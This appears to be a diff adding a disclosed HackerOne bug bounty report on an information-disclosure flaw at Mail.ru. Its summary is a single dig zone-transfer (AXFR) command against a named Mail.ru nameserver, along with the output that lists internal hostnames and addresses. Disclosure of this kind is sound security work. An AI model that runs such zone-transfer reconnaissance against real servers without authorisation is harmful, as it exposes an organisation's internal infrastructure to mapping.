@@ -1,0 +1,25 @@
+ReportLink:https://hackerone.com/reports/137093
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/isox
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:15.06.2016 14:32:24
+
+Summary:
+
+MacBook-Pro:subbrute isox$ dig @217.69.129.107 plexus.m.smailru.net axfr
+
+; <<>> DiG 9.8.3-P1 <<>> @217.69.129.107 plexus.m.smailru.net axfr
+; (1 server found)
+;; global options: +cmd
+plexus.m.smailru.net.	600	IN	SOA	ns1.mail.ru. hostmaster.mail.ru. 2300425875 900 900 1209600 300
+plexus.m.smailru.net.	600	IN	NS	plexus.m.smailru.net.
+plexus.m.smailru.net.	600	IN	A	217.69.129.107
+mail-115.plexus.m.smailru.net. 600 IN	A	192.0.2.10
+plexus.m.smailru.net.	600	IN	SOA	ns1.mail.ru. hostmaster.mail.ru. 2300425875 900 900 1209600 300
+;; Query time: 143 msec
+;; SERVER: 217.69.129.107#53(217.69.129.107)
+;; WHEN: Sun May  8 12:04:30 2016
+;; XFR size: 5 records (messages 1, bytes 187)
